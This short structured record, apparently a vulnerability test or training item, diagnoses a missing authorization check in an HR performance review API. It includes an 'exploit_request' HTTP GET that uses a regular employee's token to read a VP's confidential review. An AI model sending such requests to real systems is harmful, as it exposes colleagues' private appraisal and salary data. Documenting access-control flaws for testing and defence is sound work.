diagnosis: The HR performance review endpoint validates the reviewId format using express-openapi-validator, but fails to check whether the caller is the reviewed employee, their direct supervisor, or an HR administrator. Any authenticated employee can read manager appraisal notes, ratings, and confidential salary adjustment recommendations of other staff.
exploit_request:
GET /api/v1/hr/reviews/rev_vp_engineering_2025 HTTP/1.1
Host: hr.corp.internal:5004
Authorization: Bearer <regular_employee_token>
Accept: application/json
